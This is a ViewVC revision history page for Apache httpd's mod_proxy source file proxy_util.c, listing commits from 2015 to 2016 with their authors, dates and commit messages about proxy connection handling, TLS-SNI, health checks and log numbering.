Diff to [previous 1732954](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1732954&r2=1732986)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1732954&r2=1732986&diff_format=h))
```
mod_proxy: follow up to [r1729826](/viewvc?view=revision&revision=1729826) + [r1729847](/viewvc?view=revision&revision=1729847).
Adjust stacked ssl_hostname maximum size.

```

---

Revision [**1732954**](/viewvc?view=revision&revision=1732954) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1732954&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1732954&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1732954))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1732954)

Modified
*Mon Feb 29 21:54:23 2016 UTC*
(8 years, 10 months ago)
by *ylavic*

File length: 135916 byte(s)

Diff to [previous 1729847](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1729847&r2=1732954)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1729847&r2=1732954&diff_format=h))
```
mod_proxy: add missing APLOGNO()s.

```

---

Revision [**1729847**](/viewvc?view=revision&revision=1729847) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1729847&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1729847&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1729847))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1729847)

Modified
*Thu Feb 11 14:57:04 2016 UTC*
(8 years, 11 months ago)
by *ylavic*

File length: 135901 byte(s)

Diff to [previous 1729826](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1729826&r2=1729847)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1729826&r2=1729847&diff_format=h))
```
mod_proxy: follow up to [r1729826](/viewvc?view=revision&revision=1729826): really copy conn->ssl_hostname.

```

---

Revision [**1729826**](/viewvc?view=revision&revision=1729826) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1729826&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1729826&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1729826))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1729826)

Modified
*Thu Feb 11 13:46:39 2016 UTC*
(8 years, 11 months ago)
by *ylavic*

File length: 135647 byte(s)

Diff to [previous 1729208](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1729208&r2=1729826)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1729208&r2=1729826&diff_format=h))
```
mod_proxy: Play/restore the TLS-SNI on new backend connections which
had to be issued because the remote closed the previous/reusable one
during idle (keep-alive) time.

```

---

Revision [**1729208**](/viewvc?view=revision&revision=1729208) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1729208&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1729208&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1729208))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1729208)

Modified
*Mon Feb 8 16:50:07 2016 UTC*
(8 years, 11 months ago)
by *icing*

File length: 135443 byte(s)

Diff to [previous 1728650](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1728650&r2=1729208)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1728650&r2=1729208&diff_format=h))
```
let proxy handler forward ALPN protocol strings for ssl proxy connections

```

---

Revision [**1728650**](/viewvc?view=revision&revision=1728650) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1728650&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1728650&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1728650))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1728650)

Modified
*Fri Feb 5 12:12:14 2016 UTC*
(8 years, 11 months ago)
by *rjung*

File length: 135296 byte(s)

Diff to [previous 1728478](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1728478&r2=1728650)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1728478&r2=1728650&diff_format=h))
```
Provide dummy impl of ap_proxy_connect_uds()
in case when APR_HAVE_SYS_UN_H is not defined.
Just returns APR_ENOTIMPL.

This helps symbol export/import handling on
Netware and also seems to be more correct,
because mod_proxy.h contains ap_proxy_connect_uds()
unconditionally.

```

---

Revision [**1728478**](/viewvc?view=revision&revision=1728478) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1728478&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1728478&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1728478))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1728478)

Modified
*Thu Feb 4 13:41:19 2016 UTC*
(8 years, 11 months ago)
by *rpluem*

File length: 135265 byte(s)

Diff to [previous 1728304](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1728304&r2=1728478)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1728304&r2=1728478&diff_format=h))
```
* Introduce ap_proxy_transfer_between_connections

```

---

Revision [**1728304**](/viewvc?view=revision&revision=1728304) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1728304&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1728304&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1728304))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1728304)

Modified
*Wed Feb 3 12:52:29 2016 UTC*
(8 years, 11 months ago)
by *jim*

File length: 131855 byte(s)

Diff to [previous 1728148](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1728148&r2=1728304)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1728148&r2=1728304&diff_format=h))
```
STOPPED workers are never retried... Disabled can be.

```

---

Revision [**1728148**](/viewvc?view=revision&revision=1728148) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1728148&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1728148&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1728148))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1728148)

Modified
*Tue Feb 2 15:21:38 2016 UTC*
(8 years, 11 months ago)
by *jim*

File length: 131557 byte(s)

Diff to [previous 1726781](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1726781&r2=1728148)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1726781&r2=1728148&diff_format=h))
```
Since these are externs, prepend proxy_

```

---

Revision [**1726781**](/viewvc?view=revision&revision=1726781) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1726781&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1726781&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1726781))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1726781)

Modified
*Tue Jan 26 12:19:50 2016 UTC*
(9 years ago)
by *rpluem*

File length: 132523 byte(s)

Diff to [previous 1726779](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1726779&r2=1726781)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1726779&r2=1726781&diff_format=h))
```
* Fill missing log number

```

---

Revision [**1726779**](/viewvc?view=revision&revision=1726779) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1726779&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1726779&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1726779))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1726779)

Modified
*Tue Jan 26 12:13:56 2016 UTC*
(9 years ago)
by *rpluem*

File length: 132518 byte(s)

Diff to [previous 1725485](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1725485&r2=1726779)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1725485&r2=1726779&diff_format=h))
```
* Introduce ap_proxy_buckets_lifetime_transform as a replacement for
  proxy_buckets_lifetime_transform in mod_proxy_http. Another future consumer
  of this will be mod_proxy_wstunnel.

```

---

Revision [**1725485**](/viewvc?view=revision&revision=1725485) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1725485&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1725485&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1725485))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1725485)

Modified
*Tue Jan 19 12:02:41 2016 UTC*
(9 years ago)
by *rjung*

File length: 131123 byte(s)

Diff to [previous 1725306](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1725306&r2=1725485)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1725306&r2=1725485&diff_format=h))
```
Added many log numbers to log statements that
had none.

Those were not detected by the coccinelle script.

```

---

Revision [**1725306**](/viewvc?view=revision&revision=1725306) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1725306&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1725306&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1725306))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1725306)

Modified
*Mon Jan 18 16:54:06 2016 UTC*
(9 years ago)
by *jim*

File length: 131108 byte(s)

Diff to [previous 1725120](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1725120&r2=1725306)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1725120&r2=1725306&diff_format=h))
```
Expose this in our API

```

---

Revision [**1725120**](/viewvc?view=revision&revision=1725120) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1725120&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1725120&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1725120))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1725120)

Modified
*Sun Jan 17 20:12:09 2016 UTC*
(9 years ago)
by *jim*

File length: 130876 byte(s)

Diff to [previous 1724882](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1724882&r2=1725120)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1724882&r2=1725120&diff_format=h))
```
Make balancer manager health-check aware

```

---

Revision [**1724882**](/viewvc?view=revision&revision=1724882) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1724882&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1724882&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1724882))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1724882)

Modified
*Fri Jan 15 21:43:55 2016 UTC*
(9 years ago)
by *jim*

File length: 130749 byte(s)

Diff to [previous 1724879](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1724879&r2=1724882)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1724879&r2=1724882&diff_format=h))
```
Oops :)

```

---

Revision [**1724879**](/viewvc?view=revision&revision=1724879) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1724879&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1724879&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1724879))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1724879)

Modified
*Fri Jan 15 21:37:23 2016 UTC*
(9 years ago)
by *jim*

File length: 130918 byte(s)

Diff to [previous 1722195](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1722195&r2=1724879)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1722195&r2=1724879&diff_format=h))
```
1st cut of 'simple' tcp check... We reuse various proxy
function and so this *could* be more streamlined, but
use this to show how the other would work, since we need
brigades, SSL/TLS support, etc.

```

---

Revision [**1722195**](/viewvc?view=revision&revision=1722195) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1722195&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1722195&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1722195))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1722195)

Modified
*Tue Dec 29 17:42:19 2015 UTC*
(9 years ago)
by *jim*

File length: 130698 byte(s)

Diff to [previous 1721759](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1721759&r2=1722195)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1721759&r2=1722195&diff_format=h))
```
Make aware of new status: Failed Health Check.
Store the number of current passes/fails in shm

```

---

Revision [**1721759**](/viewvc?view=revision&revision=1721759) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1721759&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1721759&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1721759))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1721759)

Modified
*Sat Dec 26 21:29:21 2015 UTC*
(9 years, 1 month ago)
by *jim*

File length: 130502 byte(s)

Diff to [previous 1715876](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1715876&r2=1721759)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1715876&r2=1721759&diff_format=h))
```
Abstract out as macro

```

---

Revision [**1715876**](/viewvc?view=revision&revision=1715876) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1715876&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1715876&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1715876))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1715876)

Modified
*Mon Nov 23 16:46:01 2015 UTC*
(9 years, 2 months ago)
by *ylavic*

File length: 130699 byte(s)

Diff to [previous 1715869](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1715869&r2=1715876)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1715869&r2=1715876&diff_format=h))
```
Use new ap_casecmpstr[n]() functions where appropriate (not exhaustive).

```

---

Revision [**1715869**](/viewvc?view=revision&revision=1715869) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1715869&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1715869&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1715869))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1715869)

Modified
*Mon Nov 23 16:28:36 2015 UTC*
(9 years, 2 months ago)
by *ylavic*

File length: 130645 byte(s)

Diff to [previous 1715789](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1715789&r2=1715869)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1715789&r2=1715869&diff_format=h))
```
Revert [r1715789](/viewvc?view=revision&revision=1715789): will re-commit without spurious functional changes.

```

---

Revision [**1715789**](/viewvc?view=revision&revision=1715789) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1715789&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1715789&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1715789))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1715789)

Modified
*Mon Nov 23 12:33:09 2015 UTC*
(9 years, 2 months ago)
by *ylavic*

File length: 130699 byte(s)

Diff to [previous 1703902](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1703902&r2=1715789)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1703902&r2=1715789&diff_format=h))
```
Use new ap_casecmpstr[n]() functions where appropriate (not exhaustive).

[Reverted by [r1715869](/viewvc?view=revision&revision=1715869)]

```

---

Revision [**1703902**](/viewvc?view=revision&revision=1703902) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1703902&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1703902&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1703902))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1703902)

Modified
*Fri Sep 18 16:43:25 2015 UTC*
(9 years, 4 months ago)
by *ylavic*

File length: 130645 byte(s)

Diff to [previous 1703807](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1703807&r2=1703902)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1703807&r2=1703902&diff_format=h))
```
mod_proxy: Fix ProxySourceAddress binding failure with AH00938.  PR 56687.
Proposed by: Arne de Bruijn <apache arbruijn.dds.nl>
Reviewed by: ylavic

```

---

Revision [**1703807**](/viewvc?view=revision&revision=1703807) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1703807&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1703807&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1703807))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1703807)

Modified
*Fri Sep 18 10:58:58 2015 UTC*
(9 years, 4 months ago)
by *ylavic*

File length: 130307 byte(s)

Diff to [previous 1697323](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1697323&r2=1703807)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1697323&r2=1703807&diff_format=h))
```
mod_proxy: don't recyle backend announced "Connection: close" connections.
Failing to do this may lead to a race condition where we send a new request
before the backend really closes the connection (or lost SSL-Alert/FIN make
us think the connection is still alive, until the retransmission).

```

---

Revision [**1697323**](/viewvc?view=revision&revision=1697323) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1697323&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1697323&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1697323))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1697323)

Modified
*Mon Aug 24 07:43:19 2015 UTC*
(9 years, 5 months ago)
by *rpluem*

File length: 130201 byte(s)

Diff to [previous 1687783](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1687783&r2=1697323)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1687783&r2=1697323&diff_format=h))
```
* Do a more complete cleanup here. At this point we cannot end up with something useful with the data we created so far.

```

---

Revision [**1687783**](/viewvc?view=revision&revision=1687783) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1687783&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1687783&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1687783))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1687783)

Modified
*Fri Jun 26 15:10:29 2015 UTC*
(9 years, 7 months ago)
by *ylavic*

File length: 130241 byte(s)

Diff to [previous 1682819](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1682819&r2=1687783)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1682819&r2=1687783&diff_format=h))
```
mod_proxy: follow up to [r1678768](/viewvc?view=revision&revision=1678768).
The resource is not dereferenceable if connection_destructor()
is called from reslist_destroy().

```

---

Revision [**1682819**](/viewvc?view=revision&revision=1682819) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1682819&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1682819&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1682819))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1682819)

Modified
*Mon Jun 1 05:45:13 2015 UTC*
(9 years, 7 months ago)
by *jailletc36*

File length: 130226 byte(s)

Diff to [previous 1678768](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1678768&r2=1682819)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1678768&r2=1682819&diff_format=h))
```
Improve error message (related to PR57311 diagnostic)

```

---

Revision [**1678768**](/viewvc?view=revision&revision=1678768) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1678768&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1678768&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1678768))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1678768)

Modified
*Mon May 11 15:26:13 2015 UTC*
(9 years, 8 months ago)
by *ylavic*

File length: 130199 byte(s)

Diff to [previous 1678763](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1678763&r2=1678768)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1678763&r2=1678768&diff_format=h))
```
mod_proxy: check for the correct pool (lifetime) in connection_cleanup(),
according to the associated comment and the value really NULLed in
conn_pool_cleanup().

```

---

Revision [**1678763**](/viewvc?view=revision&revision=1678763) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1678763&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1678763&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1678763))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1678763)

Modified
*Mon May 11 14:53:34 2015 UTC*
(9 years, 8 months ago)
by *ylavic*

File length: 130193 byte(s)

Diff to [previous 1665215](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1665215&r2=1678763)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1665215&r2=1678763&diff_format=h))
```
mod_proxy: only cleanup the socket for a connection asked to be closed but
whose address can still be reused.

This saves unnecessary socket pool destroy and creation at cleanup and reuse
time, plus the same initialization of conn->pool's associated data which can
be reused in that case.

```

---

Revision [**1665215**](/viewvc?view=revision&revision=1665215) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1665215&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1665215&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1665215))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1665215)

Modified
*Mon Mar 9 12:45:56 2015 UTC*
(9 years, 10 months ago)
by *ylavic*

File length: 130077 byte(s)

Diff to [previous 1664709](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1664709&r2=1665215)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1664709&r2=1665215&diff_format=h))
```
mod_proxy: use the original (non absolute) form of the request-line's URI
for requests embedded in CONNECT payloads used to connect SSL backends via
a ProxyRemote forward-proxy. PR 55892.

Submitted by: Hendrik Harms <hendrik.harms gmail com>
Reviewed  by: wrowe, ylavic
Committed by: ylavic

```

---

Revision [**1664709**](/viewvc?view=revision&revision=1664709) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1664709&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1664709&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1664709))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1664709)

Modified
*Fri Mar 6 19:31:42 2015 UTC*
(9 years, 10 months ago)
by *rpluem*

File length: 129815 byte(s)

Diff to [previous 1656259](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1656259&r2=1664709)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1656259&r2=1664709&diff_format=h))
```
 * Do not reset the retry timeout if the worker is in error at this stage even
   if the connection to the backend was successful. It was likely set into
   error by a different thread / process in parallel e.g. for a timeout or
   bad status. We should respect this and should not continue with a connection
   via this worker even if we got one.

```

---

Revision [**1656259**](/viewvc?view=revision&revision=1656259) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1656259&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1656259&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1656259))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1656259)

Modified
*Sun Feb 1 00:05:59 2015 UTC*
(9 years, 11 months ago)
by *ylavic*

File length: 129242 byte(s)

Diff to [previous 1650028](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1650028&r2=1656259)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1650028&r2=1656259&diff_format=h))
```
mod_proxy_http: don't connect or reuse backend before prefetching request body.

The goal is to minimize the delay between this connection is considered alive
and the first bytes sent (should the client's link be slow or some input filter
retain the data).
This is a best effort to prevent the backend from closing (from under us) what
it thinks is an idle connection, hence to reduce to the minimum the unavoidable
local ap_proxy_is_socket_connected() vs remote keepalive race condition.
PR 56541.

Also, allow the new subprocess_env variable "proxy-flushall" to prevent any
buffering of the request body before it is forwarded to the backend.
When set, the prefetch is still done (although non-blocking), so we can still
determine Content-Length vs chunked vs spooled (depending on data available
with the header or while reading it), and then all brigades are flushed when
passed to the backend.
PR 37920.

```

---

Revision [**1650028**](/viewvc?view=revision&revision=1650028) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1650028&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1650028&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1650028))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1650028)

Modified
*Wed Jan 7 10:36:12 2015 UTC*
(10 years ago)
by *ylavic*

File length: 129206 byte(s)

Diff to [previous 1648433](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1648433&r2=1650028)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1648433&r2=1650028&diff_format=h))
```
mod_proxy: Don't put non balancer-member workers in error state by
default for connection or 500/503 errors, and honor status=+I for
any error.  PR 48388.

```

---

Revision [**1648433**](/viewvc?view=revision&revision=1648433) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1648433&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1648433&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1648433))
